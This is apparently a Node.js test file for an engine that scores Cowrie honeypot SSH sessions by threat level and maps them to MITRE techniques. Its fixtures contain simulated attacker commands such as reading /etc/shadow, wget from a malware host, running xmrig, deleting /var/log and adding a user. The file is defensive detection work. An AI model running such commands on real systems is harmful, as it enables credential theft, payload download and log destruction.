const test = require('node:test');
const assert = require('node:assert');
const engine = require('./services/correlation');

test('Empty session gets threat score of 0', (t) => {
    const result = engine.evaluateSessionEvents([]);
    assert.strictEqual(result.threatScore, 0);
    assert.strictEqual(result.riskLevel, 'LOW');
});

test('TCP connection without login gets score of 2', (t) => {
    const events = [
        { eventid: 'cowrie.session.connect', session: 'test1' },
        { eventid: 'cowrie.session.closed', session: 'test1' }
    ];
    const result = engine.evaluateSessionEvents(events);
    assert.strictEqual(result.threatScore, 2);
    assert.strictEqual(result.dimensions.access, 2);
});

test('Failed logins increment score and cap at 12', (t) => {
    const events = [
        { eventid: 'cowrie.session.connect', session: 'test1' },
        { eventid: 'cowrie.login.failed', session: 'test1' },
        { eventid: 'cowrie.login.failed', session: 'test1' },
        { eventid: 'cowrie.login.failed', session: 'test1' },
        { eventid: 'cowrie.login.failed', session: 'test1' }, // 4 fails -> dictionary
    ];
    const result = engine.evaluateSessionEvents(events);
    assert.strictEqual(result.dimensions.access, 12);
    assert.strictEqual(result.mitre.some(m => m.id === 'T1110'), true);
});

test('Successful login alone gets 10', (t) => {
    const events = [
        { eventid: 'cowrie.session.connect', session: 'test1' },
        { eventid: 'cowrie.login.success', session: 'test1', username: 'admin' },
    ];
    const result = engine.evaluateSessionEvents(events);
    assert.strictEqual(result.dimensions.access, 10);
});

test('Successful root login gets 15 (10+5)', (t) => {
    const events = [
        { eventid: 'cowrie.session.connect', session: 'test1' },
        { eventid: 'cowrie.login.success', session: 'test1', username: 'root' },
    ];
    const result = engine.evaluateSessionEvents(events);
    assert.strictEqual(result.dimensions.access, 15);
});

test('Duplicate commands do not infinitely inflate activity score', (t) => {
    const events = [
        { eventid: 'cowrie.session.connect' },
        { eventid: 'cowrie.login.success', username: 'root' },
        { eventid: 'cowrie.command.input', input: 'cat /etc/shadow' },
        { eventid: 'cowrie.command.input', input: 'cat /etc/shadow' },
        { eventid: 'cowrie.command.input', input: 'cat /etc/shadow' },
        { eventid: 'cowrie.command.input', input: 'whoami' },
        { eventid: 'cowrie.command.input', input: 'whoami' }
    ];
    const result = engine.evaluateSessionEvents(events);
    
    // Deduplication should mean only 1 unique cred hit and 1 unique recon hit
    assert.strictEqual(result.summary.credentialAccessCount, 1);
    assert.strictEqual(result.summary.reconCount, 1);
    
    // activityScore = credScore(min(15, 1*8)) + reconScore(5 for 1 hit) = 13
    assert.strictEqual(result.dimensions.activity, 13);
});

test('Weaponization limits apply', (t) => {
    const events = [
        { eventid: 'cowrie.session.connect' },
        { eventid: 'cowrie.login.success', username: 'root' },
        { eventid: 'cowrie.command.input', input: 'wget http://malware.com' },
        { eventid: 'cowrie.command.input', input: 'chmod +x' },
        { eventid: 'cowrie.command.input', input: 'xmrig' }
    ];
    const result = engine.evaluateSessionEvents(events);
    
    // DL(6) + EXEC(8) + CHAIN(5) + CRYPTO(8) = 27 -> capped at 25
    assert.strictEqual(result.dimensions.weaponization, 25);
    assert.strictEqual(result.mitre.some(m => m.id === 'T1105'), true);
});

test('Risk score boundary enforcement', (t) => {
    // Generate an insane amount of activity
    const events = [
        { eventid: 'cowrie.session.connect' },
        { eventid: 'cowrie.login.success', username: 'root' },
        { eventid: 'cowrie.login.failed' },
        { eventid: 'cowrie.command.input', input: 'wget http://malware.com' },
        { eventid: 'cowrie.command.input', input: 'chmod +x' },
        { eventid: 'cowrie.command.input', input: 'xmrig' },
        { eventid: 'cowrie.command.input', input: 'whoami' },
        { eventid: 'cowrie.command.input', input: 'cat /etc/shadow' },
        { eventid: 'cowrie.command.input', input: 'rm -rf /var/log' },
        { eventid: 'cowrie.command.input', input: 'useradd hacker' },
        { eventid: 'cowrie.command.input', input: 'ssh pivot' }
    ];
    const result = engine.evaluateSessionEvents(events);
    assert.ok(result.threatScore <= 100);
});

test('Deduplicating scoring evidence does not modify original records', (t) => {
    const events = [
        { eventid: 'cowrie.command.input', input: 'whoami' },
        { eventid: 'cowrie.command.input', input: 'whoami' }
    ];
    engine.evaluateSessionEvents(events);
    assert.strictEqual(events.length, 2);
    assert.strictEqual(events[0].input, 'whoami');
});

test('Malformed timestamps handled safely', (t) => {
    const events = [
        { eventid: 'cowrie.session.connect', timestamp: 'invalid-date' },
        { eventid: 'cowrie.session.closed', timestamp: null }
    ];
    const result = engine.evaluateSessionEvents(events);
    assert.strictEqual(result.threatScore, 2); // Still scored correctly
});

test('Reconnaissance detection is case-insensitive', () => {
    const events = [
        { eventid: 'cowrie.login.success', username: 'root' },
        { eventid: 'cowrie.command.input', input: 'WHOAMI' }
    ];

    const result = engine.evaluateSessionEvents(events);

    assert.strictEqual(result.summary.reconCount, 1);
});

test('Download detection is case-insensitive', () => {
    const events = [
        { eventid: 'cowrie.login.success', username: 'root' },
        { eventid: 'cowrie.command.input', input: 'WGET http://example.com/payload' }
    ];

    const result = engine.evaluateSessionEvents(events);

    assert.strictEqual(result.summary.downloadCount, 1);
});
